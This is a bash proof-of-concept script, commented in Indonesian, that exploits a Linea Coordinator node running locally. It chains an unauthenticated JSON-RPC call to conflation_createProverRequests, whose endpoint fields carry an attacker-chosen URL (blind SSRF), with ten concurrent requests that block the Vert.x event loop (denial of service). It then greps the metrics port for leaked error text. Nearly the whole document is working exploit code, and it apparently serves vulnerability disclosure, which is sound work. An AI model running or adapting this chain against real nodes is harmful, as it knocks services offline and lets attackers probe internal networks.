cat << 'EOF' > poc_ssrf_dos.sh
#!/bin/bash

# ==============================================================================
# POC: Blind SSRF + Event Loop DoS + Information Disclosure
# Target: Linea Coordinator (Localnet via E2E Docker Infra)
# Exploit Chain: JSON-RPC Unauth -> Blind SSRF -> Vert.x Event Loop Blocking
# ==============================================================================

COORDINATOR_API_URL="http://127.0.0.1:8545"
COORDINATOR_METRICS_URL="http://127.0.0.1:9545"

# URL target untuk SSRF. Kita arahkan ke port observability Coordinator sendiri.
# Coordinator akan GET request port ini (menerima plain text Prometheus),
# padahal ia mengharapkan JSON-RPC, sehingga memicu Exception yang tercatat di log.
SSRF_TARGET_URL="http://127.0.0.1:9545/metrics"

echo "======================================================"
echo "  LINEA COORDINATOR SSRF & DOS EXPLOIT (ONE-SHOT)    "
echo "======================================================"

# 1. BEFORE EXPLOIT: Normal Flow Check
echo -e "\n[1] CEK NORMAL FLOW (BEFORE EXPLOIT)"
echo "Mengirim request API normal ke Coordinator..."
NORMAL_PAYLOAD='{"jsonrpc":"2.0","method":"conflation_getReconflationJobsStatus","params":["test-job-id"],"id":1}'

START_TIME=$(date +%s%N)
NORMAL_RESP=$(curl -s --max-time 5 -X POST "$COORDINATOR_API_URL/" -H "Content-Type: application/json" -d "$NORMAL_PAYLOAD")
END_TIME=$(date +%s%N)
DURATION_NORMAL=$(( (END_TIME - START_TIME) / 1000000 ))

echo "Respons normal API: $NORMAL_RESP"
echo "Waktu respons normal: ${DURATION_NORMAL} ms"
echo "Status: API Coordinator berjalan normal."

# 2. THE EXPLOIT: Trigger Blind SSRF & Event Loop Blocking
echo -e "\n[2] MULAI EKSPLOITASI (SSRF + DO S)"
echo "Mengirim payload SSRF ke Coordinator (Target: $SSRF_TARGET_URL)..."

SSRF_PAYLOAD=$(cat <<JSONEOF
{
  "jsonrpc": "2.0",
  "method": "conflation_createProverRequests",
  "params": [{
    "startBlockNumber": 1,
    "endBlockNumber": 2,
    "blobCompressorVersion": "V3",
    "tracesApi": {
      "endpoint": "$SSRF_TARGET_URL",
      "requestLimitPerEndpoint": 1
    },
    "shomeiApi": {
      "endpoint": "http://127.0.0.1:8545",
      "requestLimitPerEndpoint": 1
    }
  }],
  "id": 1
}
JSONEOF
)

# Mengirim 10 request secara concurrent.
# Karena constructor ConflationBacktestingApp memanggil .get() (Blocking I/O),
# 10 request ini akan mengunci semua thread Vert.x Event Loop.
echo "Mengirim 10 request concurrent untuk memblokir Event Loop..."
for i in {1..10}; do
  curl -s --max-time 10 -X POST "$COORDINATOR_API_URL/" -H "Content-Type: application/json" -d "$SSRF_PAYLOAD" > /dev/null &
done

echo "Menunggu 5 detik agar Coordinator memproses request dan Event Loop tersumbat..."
sleep 5

# 3. AFTER EXPLOIT (Impact 1): Denial of Service (DoS)
echo -e "\n[3] VERIFIKASI IMPACT 1: DENIAL OF SERVICE (DoS)"
echo "Mencoba mengakses API Coordinator kembali (Normal request)..."

START_TIME_DOS=$(date +%s%N)
# Jika Event Loop tersumbat, request ini akan timeout (exit code 28) atau sangat lambat.
DOS_RESP=$(curl -s --max-time 5 -X POST "$COORDINATOR_API_URL/" -H "Content-Type: application/json" -d "$NORMAL_PAYLOAD")
EXIT_CODE=$?
END_TIME_DOS=$(date +%s%N)
DURATION_DOS=$(( (END_TIME_DOS - START_TIME_DOS) / 1000000 ))

if [ $EXIT_CODE -eq 28 ]; then
  echo "[!!!] KRITIKAL: API mengalami TIMEOUT (Response time > 5000ms)."
  echo "[!!!] DoS TERKONFIRMASI: Vert.x Event Loop 100% tersumbat! Coordinator tidak bisa melayani request apa pun."
elif [ "$DURATION_DOS" -gt 1000 ]; then
  echo "[!!!] KRITIKAL: API merespons sangat lambat dalam ${DURATION_DOS} ms."
  echo "[!!!] DoS TERKONFIRMASI: Event Loop mengalami kebuntuan parah."
else
  echo "[-] API masih responsif (${DURATION_DOS} ms). Mungkin thread pool belum sepenuhnya habis."
fi

# 4. AFTER EXPLOIT (Impact 2): Information Disclosure via SSRF
echo -e "\n[4] VERIFIKASI IMPACT 2: INFORMATION DISCLOSURE (SSRF Triggered)"
echo "Mengakses Port Observability Coordinator (/metrics)..."
echo "Mencari error log akibat Coordinator gagal parse Plain Text (respons dari /metrics) sebagai JSON-RPC..."
echo "--------------------------------------------------"
# Coordinator mencatat error seperti "Unrecognized token" atau "JsonParseException"
LEAKED_DATA=$(curl -s "$COORDINATOR_METRICS_URL/metrics" | grep -i -E "Unrecognized|JsonParse|IOException|Failed to parse|error")

if [ -z "$LEAKED_DATA" ]; then
  echo "[-] Data error spesifik tidak ditemukan di /metrics. (Namun, permintaan HTTP outbound SSRF tetap dieksekusi)."
else
  echo "[!!!] TERKONFIRMASI: Error log dari proses SSRF berhasil ditemukan di port Observability:"
  echo "$LEAKED_DATA"
fi
echo "--------------------------------------------------"
echo "Eksploitasi Selesai."
EOF

chmod +x poc_ssrf_dos.sh
./poc_ssrf_dos.sh
